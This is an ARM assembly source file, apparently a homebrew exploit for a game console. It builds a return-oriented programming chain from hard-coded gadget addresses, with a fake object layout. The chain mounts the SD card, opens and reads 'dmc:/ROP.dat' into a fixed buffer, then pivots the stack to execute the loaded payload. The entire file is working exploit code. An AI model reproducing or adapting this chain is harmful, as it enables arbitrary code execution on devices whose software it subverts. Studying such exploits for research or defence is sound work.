	.arm
	.section .rodata.rop

#define BUFFER_LOC 0x08F01000
#define BUFFER_SIZE 0x00004000

	.global	_start
@---------------------------------------------------------------------------------
_start:
	@ mount SD
		.word 0x0010C2FC @ LDMFD   SP!, {R0,PC}
		.word 0x001050B3 @ R0 = "dmc:"
		.word 0x0019CA34 @ FS_MOUNTSDMC(), then LDMFD   SP!, {R3-R5,PC}
		.word 0xDEADBEEF @ R3, dummy
		.word 0xDEADBEEF @ R4, dummy
		.word 0xDEADBEEF @ R5, dummy
	@ open file
		.word 0x001946EB @ POP     {R0-R4,R7,PC}
		.word 0x08F10000 @ R0 = this
		.word FileName @ R1 = filename
		.word 0x00000001 @ R2 = permission
		.word 0xDEADBEEF @ R3, dummy
		.word 0xDEADBEEF @ R4, dummy
		.word 0xDEADBEEF @ R7, dummy
		.word 0x0022FE0C @ IFile_Open(), then LDMFD   SP!, {R4-R7,PC}
		.word 0xDEADBEEF @ R4, dummy
		.word 0xDEADBEEF @ R5, dummy
		.word 0xDEADBEEF @ R6, dummy
		.word 0xDEADBEEF @ R7, dummy
		.word 0x001057C4 @ POP {PC}
	@ read payload
		.word 0x001946EB @ POP     {R0-R4,R7,PC}
		.word 0x08F10000 @ R0 = this
		.word 0x08F10020 @ R1 = total_read
		.word BUFFER_LOC @ R2 = buffer
		.word BUFFER_SIZE @ R3 = size
		.word 0xDEADBEEF @ R4, dummy
		.word 0xDEADBEEF @ R7, dummy
		.word 0x001686E0 @ IFile_Read, then LDMFD   SP!, {R4-R9,PC}
		.word 0xDEADBEEF @ R4, dummy
		.word 0xDEADBEEF @ R5, dummy
		.word 0xDEADBEEF @ R6, dummy
		.word 0xDEADBEEF @ R7, dummy
		.word 0xDEADBEEF @ R8, dummy
		.word 0xDEADBEEF @ R9, dummy
		.word 0x001057C4 @ nop
		.word 0x001057C4 @ nop
	@ jump to payload
		.word 0x001065A8 @ LDMFD   SP!, {R4-R12,PC}
		.word 0xDEADBEEF @ R4, dummy
		.word 0xDEADBEEF @ R5, dummy
		.word 0xDEADBEEF @ R6, dummy
		.word 0xDEADBEEF @ R7, dummy
		.word 0xDEADBEEF @ R8, dummy
		.word 0xDEADBEEF @ R9, dummy
		.word 0xDEADBEEF @ R10, dummy
		.word 0xDEADBEEF @ R11, dummy
		.word 0x001057C4 @ R12, POP {PC}
		.word 0x002C5AE0 @ LDMFD   SP!, {R4-R6,LR}, BX R12
		.word 0xDEADBEEF @ R4, dummy
		.word 0xDEADBEEF @ R5, dummy
		.word 0xDEADBEEF @ R6, dummy
		.word BUFFER_LOC-4 @ LR
		.word 0x00130358 @ SP = LR, LDMFD   SP!, {LR,PC}
	.section .rodata.init
InitData:
	.word 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, _start+0x8C, 0, 0, 0, 0, 0
	.word 0, 0, 0, 0, 0, 0, 0, _start, 0x001057C4, 0x001057C4, 0, 0, 0, 0, 0, 0
	.word 0, 0, 0, 0x0010C2FC, _start+0x218, 0, 0, 0x001057C4, 0, 0, 0, 0, 0, 0, 0, 0
	.word 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
	.word 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
Self:
	.word Self, 0x001057C4, 0, 0, 0, 0, 0, 0, 0, 0x00130344, 0, 0, 0, 0, 0, 0
	.word 0, 0, 0, 0, 0, 0, 0, 0

	.section .rodata
	.balign 16
FileName:
	.string16 "dmc:/ROP.dat"
Padding:
	.word 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
	.word 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
